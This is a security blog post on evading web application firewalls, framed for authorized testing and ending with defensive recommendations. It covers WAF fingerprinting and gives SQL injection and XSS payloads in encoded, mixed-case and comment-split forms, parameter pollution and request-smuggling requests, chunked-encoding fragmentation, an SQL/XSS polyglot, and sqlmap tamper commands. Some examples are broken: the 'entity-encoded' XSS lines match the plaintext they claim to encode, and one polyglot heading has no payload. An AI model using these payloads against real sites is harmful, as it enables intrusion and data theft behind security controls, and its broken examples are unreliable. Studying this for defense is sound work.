The WAF Evasion Playbook: From Fingerprinting to Request Smuggling & Polyglot Bypasses

📅 Apr 05, 2024 ⏱ 11 min read
#waf #bypass #evasion #web #advanced

Web Application Firewalls (WAFs) are a critical layer of defense for modern web applications, sitting between clients and back-end servers to inspect, filter, and block malicious HTTP/S traffic. From enterprise on-premises appliances to cloud-native managed services, WAFs have become a near-ubiquitous control in production environments. But for penetration testers and red teamers, understanding how WAFs work — and where they fall short — is equally essential. This post dives deep into WAF architecture, detection strategies, and the full spectrum of evasion techniques documented in the wild.

⚠️ Disclaimer: All techniques described here are for educational purposes and authorized security testing only. Applying these methods against systems you do not own or have explicit written permission to test is illegal and unethical.

What Is a Web Application Firewall?

A WAF operates at Layer 7 (the application layer) of the OSI model, inspecting HTTP request and response bodies, headers, cookies, and URI parameters. Unlike a traditional network firewall that works at Layers 3–4 based on IP addresses and ports, a WAF understands web application protocols and can distinguish between a legitimate search query and a SQL injection attempt.

WAFs use two primary detection paradigms:

  • Blacklist / Signature-based: Maintains a database of known attack patterns (e.g., OWASP ModSecurity Core Rule Set). Fast and effective for known vectors but blind to novel or obfuscated payloads.
  • Whitelist / Positive security model: Defines what valid traffic looks like and blocks everything else. More robust but expensive to configure and prone to false positives.
  • Anomaly scoring: Assigns risk scores to individual rule matches and blocks requests exceeding a threshold. Used by most modern WAFs (ModSecurity paranoia levels, AWS WAF managed rules).
  • Behavioural / ML-based: Learns baseline traffic patterns and flags statistical anomalies. Increasingly common in cloud WAF offerings.

Types of WAFs

Cloud-Based WAFs

Services like Cloudflare WAF, AWS WAF, Akamai Kona Site Defender, and Fastly Next-Gen WAF operate as a reverse proxy in front of your origin. Traffic is routed through the provider's network, inspected, and only clean requests are forwarded. They offer rapid rule updates, global anycast delivery, and zero hardware overhead, but introduce a third-party dependency and can complicate incident response.

Hardware Appliances

Dedicated physical appliances — F5 BIG-IP Advanced WAF, Barracuda Web Application Firewall, Imperva SecureSphere — are deployed on-premises inline or in bridge mode. They offer high throughput with hardware-accelerated TLS termination and deep packet inspection, but require significant capital expenditure and skilled operators for tuning.

Software / Host-Based WAFs

ModSecurity (now the Coraza project) is an open-source WAF engine that runs as an Apache/Nginx/IIS module directly on the web server. It's highly customizable, free, and widely deployed, making it a common target during engagements. NAXSI is a lightweight Nginx-native alternative that focuses on whitelist rules.

Detecting a WAF

Before attempting any bypass, identify whether a WAF is present and which product it is. Several fingerprinting techniques exist:

  • Response codes & bodies: Send an obviously malicious request (e.g., ?id=1' OR '1'='1) and observe. A WAF will often return 403, 406, 429, or a custom block page with vendor-specific branding.
  • HTTP response headers: Look for headers like X-Sucuri-ID, CF-RAY (Cloudflare), X-CDN, Server: AkamaiGHost, or X-Denied-Reason.
  • Cookie names: __cfduid / _cfuvid (Cloudflare), visid_incap (Imperva), barra_counter_session (Barracuda).
  • Automated fingerprinting with wafw00f:
# Install wafw00f
pip install wafw00f

# Detect WAF on a target (authorized systems only)
wafw00f https://target.example.com

# Verbose output — shows raw detection heuristics
wafw00f -v https://target.example.com

# Test all known WAF signatures
wafw00f -a https://target.example.com

# Output results in JSON format
wafw00f -o results.json -f json https://target.example.com

wafw00f sends a series of crafted requests and analyses responses against a database of 140+ WAF fingerprints. The output tells you the product name, allowing you to research its specific rule sets and known weaknesses before going further.

Encoding-Based Bypasses

Many WAF rule sets inspect the raw request string. If the payload can be encoded in a way the WAF does not decode but the back-end application does, the WAF is effectively blind to it.

URL Encoding

Percent-encoding replaces characters with their hex ASCII equivalents. The web server / application framework automatically decodes these before passing values to the application layer, but a WAF operating on the raw request may not perform multi-level decoding.

# Plaintext payload (blocked)
' OR '1'='1

# Single URL-encoded (often blocked by modern WAFs)
%27 OR %271%27=%271

# Double URL-encoded (WAF decodes once, application decodes twice)
%2527 OR %25271%2527=%2527%31

# Mixed encoding
%27 OR %271%27%3d%271

# Encoding only the dangerous characters
'%20OR%20'1'='1

Unicode & UTF-8 Overlong Encoding

Some WAFs fail to normalise Unicode before matching. Overlong UTF-8 sequences represent ASCII characters using more bytes than necessary — technically invalid UTF-8, but historically accepted by several web servers and PHP versions. Similarly, full-width Unicode characters (U+FF01–U+FF5E) map to ASCII equivalents and may bypass pattern matches.

# Full-width Unicode SQL keyword
ＳＥＬＥＣＴ  →  SELECT   (U+FF33 U+FF25 U+FF2C U+FF25 U+FF23 U+FF34)

# HTML entity encoding (effective in parameters reflected in HTML context)
' OR 1=1   →   ' OR 1=1

# IIS-specific: %u encoding (Unicode escape sequences)
%u0027 OR %u00271%u0027=%u0027%u0031

HTML Entity Encoding

When user input is reflected inside HTML attributes or JavaScript in server-rendered pages, HTML entity-encoded payloads may bypass WAF string matching while still being decoded by the browser's HTML parser before script execution:

<!-- Plaintext XSS (blocked) -->
<script>alert(1)</script>

<!-- HTML entity encoded (may bypass signature matching) -->
<script>alert(1)</script>

<!-- Decimal entities -->
<img src=x onerror=alert(1)>

<!-- Hex entities -->
<img src=x onerror=alert(1)>

Case Variation & Comment Injection

SQL is case-insensitive by standard, and most database engines accept mixed-case keywords. Naïve WAF rules that match only lowercase or uppercase keyword patterns can be evaded trivially:

-- Standard payload (blocked)
SELECT * FROM users WHERE id=1 OR 1=1--

-- Mixed case (bypasses case-sensitive pattern matching)
SeLeCt * FrOm users WHerE id=1 Or 1=1--

-- Inline comment injection — MySQL and PostgreSQL accept /**/ as whitespace
SE/**/LECT * FR/**/OM users WHE/**/RE id=1 OR/**/1=1--

-- Nested comments (PostgreSQL)
SE/*foo*/LE/*bar*/CT 1,2,3--

-- NULL bytes as separators (some parsers strip NULLs)
SEL%00ECT * FROM users--

-- Whitespace alternatives: tabs, newlines, carriage returns
SELECT%09*%09FROM%09users
SELECT%0A*%0AFROM%0Ausers

-- Scientific notation for numeric values
id=1e0 UNION SELECT 1,2,3--   -- 1e0 == 1 in MySQL

HTTP Parameter Pollution (HPP)

When a request contains duplicate parameter names, different components of the web stack may handle the duplicates differently. The WAF may inspect the first occurrence of a parameter while the application uses the last (or vice versa), allowing attackers to split a malicious payload across multiple instances:

# Normal request (WAF inspects and blocks)
GET /search?q=' OR '1'='1 HTTP/1.1

# HPP — WAF may only check the first 'q' value ("hello")
# while PHP uses the last value containing the payload
GET /search?q=hello&q=' OR '1'='1 HTTP/1.1

# HPP in POST body (application/x-www-form-urlencoded)
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&username=' OR '1'='1'--

# ASP.NET concatenates duplicate parameters with a comma:
# q=hello,' OR '1'='1  — may bypass exact-match rules

HTTP Request Smuggling

Request smuggling exploits discrepancies between how a front-end proxy (or WAF) and a back-end server parse HTTP/1.1 message boundaries. The WAF sees one request; the back-end sees two. This allows an attacker to "smuggle" a malicious request past the WAF entirely — the WAF never inspects the smuggled payload because it is framed as part of the body of the first request.

Two classic variants exist:

  • CL.TE: The front-end uses Content-Length; the back-end uses Transfer-Encoding: chunked.
  • TE.CL: The front-end uses Transfer-Encoding: chunked; the back-end uses Content-Length.
POST / HTTP/1.1
Host: target.example.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X

In the CL.TE scenario above, the WAF reads 30 bytes using Content-Length and forwards the "complete" request. The back-end, honouring Transfer-Encoding: chunked, sees a zero-length chunk (request end) followed by a new request for /admin — a path that would have been blocked had it been sent directly. Tools like HTTP Request Smuggler (Burp Suite extension) automate detection and exploitation.

Chunked Transfer Encoding Obfuscation

Beyond request smuggling, chunked encoding can be used to fragment payloads such that the WAF's stream-based pattern matcher never sees the complete attack string in a single buffer:

POST /vulnerable HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

3
id=
8
1' UNION
7
 SELECT
9
 1,2,3--
0

Each chunk is individually innocuous. A WAF that inspects chunks independently and does not reassemble the full stream before applying rules will see only id=, 1' UNION, SELECT, etc. — none of which may individually trigger a rule. The back-end, however, reassembles the full body: id=1' UNION SELECT 1,2,3--.

The Transfer-Encoding header itself can also be obfuscated to prevent the WAF from recognising chunked mode while the back-end still accepts it:

# Space before colon (accepted by some servers, not WAFs)
Transfer-Encoding : chunked

# Tab separation
Transfer-Encoding:	chunked

# X-header smuggling — some proxies accept this alias
X-Transfer-Encoding: chunked

# Duplicate TE headers with conflicting values
Transfer-Encoding: identity
Transfer-Encoding: chunked

Polyglot Payloads

A polyglot payload is valid in multiple contexts simultaneously — for example, a string that is both valid SQL and a working XSS payload. By combining multiple attack classes into a single ambiguous token, polyglots can exploit context-specific WAF rule gaps where rules for one vector don't cover another:

# SQL + XSS polyglot
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--

# LDAP + XSS polyglot (for applications passing input to both parsers)

Automated WAF Bypass with sqlmap

sqlmap includes a rich library of tamper scripts specifically designed to evade WAF detection. These scripts transform payloads on the fly before each request:

# Basic sqlmap run against a WAF-protected target
sqlmap -u "https://target.example.com/item?id=1" --batch --dbs

# Apply multiple tamper scripts for WAF evasion
sqlmap -u "https://target.example.com/item?id=1" \
  --tamper=space2comment,randomcase,between,charencode \
  --batch --level=5 --risk=3 --dbs

# Tamper script reference:
#   space2comment   — replaces spaces with /**/
#   randomcase      — randomises keyword case (SeLeCt)
#   between         — replaces > with NOT BETWEEN 0 AND
#   charencode      — URL-encodes all characters in payload
#   base64encode    — base64-encodes the payload (for specific injection points)
#   equaltolike     — replaces = with LIKE operator
#   apostrophemask  — replaces ' with its UTF-8 full-width equivalent

# Slow down requests to avoid rate-based blocking
sqlmap -u "https://target.example.com/item?id=1" \
  --tamper=space2comment,randomcase \
  --delay=2 --safe-freq=3 --batch --dbs

# Use a custom User-Agent and random headers to blend in
sqlmap -u "https://target.example.com/item?id=1" \
  --tamper=charencode \
  --random-agent --headers="X-Forwarded-For: 127.0.0.1" \
  --batch --dbs

Additional Evasion Techniques

IP Reputation & Header Spoofing

Cloud WAFs often apply stricter rules to traffic from known datacenter IP ranges (VPS, Tor exit nodes, hosting providers). Using residential proxies or rotating mobile IP pools can reduce the risk of blanket IP-based blocks. Additionally, headers like X-Forwarded-For, X-Real-IP, and X-Originating-IP may be trusted by the WAF to determine the "real" client IP — injecting 127.0.0.1 or an internal IP can sometimes downgrade the threat score applied to a request.

Content-Type Confusion

WAF rules are often content-type aware — JSON body rules differ from form-encoded rules. Sending a payload with a mismatched or unusual Content-Type (e.g., application/x-www-form-urlencoded data framed as text/plain, or a JSON payload with Content-Type: application/xml) may route the request through a less-scrutinised code path in the WAF engine.

Rate Limiting & Timing

Behavioural WAFs establish baseline request rates. Spreading malicious requests across a longer window, interleaving them with legitimate traffic, or introducing jitter between requests can keep per-IP anomaly scores below blocking thresholds. Combining this with different source IPs (distributed attack infrastructure) makes statistical detection significantly harder.

GraphQL & Alternative Endpoints

Applications exposing GraphQL endpoints frequently have weaker WAF coverage than their REST counterparts because the query structure (deeply nested JSON with introspection) is harder to write signature rules for. Similarly, legacy API versions (/api/v1/ vs /api/v3/) or mobile-specific endpoints may lack the same WAF rule coverage as the primary web surface.

Defence Recommendations

Understanding evasion is equally useful for defenders. Key hardening measures:

  • Enable full URL decoding normalisation in the WAF before rule matching — decode percent-encoding, Unicode, and HTML entities in sequence.
  • Increase paranoia/sensitivity levels for ModSecurity CRS (paranoia level 3–4) and accept the tuning overhead of false positives.
  • Deploy request smuggling mitigations: Ensure the WAF and origin use the same HTTP parsing library, reject requests with both Content-Length and Transfer-Encoding, and enforce HTTP/2 end-to-end where possible.
  • Apply WAF rules to all endpoints uniformly — including API v1, v2, GraphQL, and WebSocket upgrade paths.
  • Combine WAF with DAST: Regular dynamic application security testing using tools like Burp Suite Pro or OWASP ZAP catches vulnerabilities that WAF bypass would expose anyway.
  • Log and alert on WAF block events and review them regularly — a spike in 403s from a single IP is an early indicator of reconnaissance or active exploitation attempts.

Conclusion

WAFs are not a silver bullet. They provide a meaningful layer of defence-in-depth, particularly against automated, commodity attacks, but a determined attacker with knowledge of the target's WAF product and application behaviour can often find a path around them. The techniques covered in this post — encoding bypasses, case variation, comment injection, HPP, request smuggling, chunked encoding fragmentation, and polyglot payloads — are all well-documented in public research and are routinely tested in professional penetration engagements.

The correct mental model is: a WAF buys you time and raises the cost of an attack — it does not eliminate the need for secure-by-design application code, parameterised queries, output encoding, and a robust vulnerability management programme. Use WAF bypass knowledge to validate your defences, tune your rules, and build a more resilient security posture.
